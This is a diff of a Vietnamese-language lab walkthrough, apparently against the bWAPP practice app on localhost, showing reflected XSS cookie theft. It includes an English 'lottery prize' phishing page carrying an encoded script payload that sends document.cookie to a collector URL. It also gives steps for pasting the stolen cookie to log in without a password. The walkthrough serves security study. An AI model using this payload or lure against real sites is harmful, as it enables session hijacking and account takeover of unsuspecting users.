@@ -43,20 +43,31 @@ Code php crawl cookie:
 * Tạo một url phishing
 ```html
 <html>
-  <head>
-      <title>CHUC MUNG!!!</title>
-  </head>
-  <body>
-      <h1 align="center">Bạn đã trúng tour du lịch vòng quanh Mỹ Đình</h1>
-      <h1 align="center">-Mỹ Đình Bus-</h1>
-  Xem thông tin chi tiết <a href='http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=Thiep&form=submit'>tai day</a> .
-  </body>
+    <head>
+        <title>Lottery</title>
+    </head>
+    <body>
+	    <h1 align="center">CONGRATULATIONS!!!</h1>
+	    <h1 align="center">YOU WON!!!</h1>
+	    Click this <a href="http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=A&form=submit">link</a> to see your prize
+    </body>
 </html>
 ```
 
 Tiếp theo, lừa người dùng click vào link phishing
 
-![image](https://github.com/user-attachments/assets/009dbf69-a15d-4145-be39-23f1c6a4b5ea)
+![image](https://github.com/user-attachments/assets/b11b655f-febd-44f3-8afe-0df393e30ed0)
 
 Khi mục tiêu ấn click vào link sẽ bị chuyển hướng tới web đã bị đệm javascript, sau đó sẽ bị crawl cookie về cookie.txt tại máy attacker:
 
+![image](https://github.com/user-attachments/assets/7dd1b4e2-8b66-4523-847b-f93117a7cf0f)
+
+Copy cookie và vào trình duyệt paste cái cookie này vào
+
+![image](https://github.com/user-attachments/assets/1f7734b6-bfe2-4068-b3da-bf2efafca3c7)
+
+Kết quả sau khi add cookie ta đã login mà không cần mật khẩu
+
+![image](https://github.com/user-attachments/assets/79a836ee-6dcc-4d39-8b35-ae3dc4afbf0c)
+
+Kết thúc bài.
